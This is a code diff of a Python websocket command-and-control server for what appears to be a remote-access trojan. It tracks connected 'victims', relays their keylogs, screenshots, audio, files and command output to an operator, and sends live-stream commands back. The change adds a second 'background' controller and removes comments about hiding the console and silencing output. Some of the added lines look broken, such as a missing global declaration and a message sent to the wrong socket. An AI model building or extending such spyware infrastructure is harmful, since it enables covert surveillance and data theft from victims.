@@ -1,10 +1,6 @@
 import sys
 import os
 
-# HIDE CONSOLE WINDOW ON WINDOWS
-
-
-# REDIRECT ALL OUTPUT TO NULL (SILENT MODE)
 
 import asyncio
 import websockets
@@ -12,7 +8,8 @@ import uuid
 
 victims = {}
 rdid=None
-controller = None  # Only track ONE controller
+controller = None  
+background_controller=None
 
 async def handler(websocket):
     global controller,rdid
@@ -21,24 +18,27 @@ async def handler(websocket):
         print(first_msg)
     except websockets.ConnectionClosed:
         return
-
-    if first_msg.find(":VICTIM-777777") !=-1:
+    if first_msg.find("ROLE:BACKROUND")!=-1:
+        background_controller=websocket
+        for vid in victims.keys():
+            await controller.send(f"EXISTING_VICTIM:{vid}")
+    elif first_msg.find(":VICTIM-777777") !=-1:
         victim_id = first_msg[:first_msg.find(":VICTIM-777777")]
         victims[victim_id] = websocket
         rdid=victim_id
-        # Notify SINGLE controller
         if controller:
             await controller.send(f"NEW_VICTIM:{victim_id}")
+            await background_controller.send(f"NEW_VICTIM:{victim_id}")
         
         try:
             async for message in websocket:
                 print(message)
-                # Handle BINARY data (screenshots, audio, files)
+
                 if isinstance(message, bytes):
                     if controller:
                         await controller.send(message)
                 
-                # Handle TEXT responses
+
                 elif isinstance(message, str):
                     if message.startswith((
                         "KEYLOG:", "OUTPUT:", "ERROR:", "PONG:", 
@@ -48,8 +48,6 @@ async def handler(websocket):
                             await controller.send(message)
                     if message=="READY_FOR_FILE":
                         rdid=victim_id
-
-                    # In controller message handler:
                     
 
                     
@@ -64,7 +62,7 @@ async def handler(websocket):
     elif first_msg == "ROLE:CONTROLLER":
         controller = websocket
         
-        # Send existing victims to new controller
+
         for vid in victims.keys():
             await controller.send(f"EXISTING_VICTIM:{vid}")
         
@@ -74,7 +72,7 @@ async def handler(websocket):
                 if message == "START_LIVE_STREAM" or message == "STOP_LIVE_STREAM":
                         # Send directly to ACTIVE victim (you already track this)
                         if victims:  # Since you only have one victim
-                            victim_ws = next(iter(victims.values()))  # Get first/only victim
+                            victim_ws = next(iter(victims.values())) 
                             await victim_ws.send(message)
                 if isinstance(message, str) and ":" in message:
                     parts = message.split(":", 2)
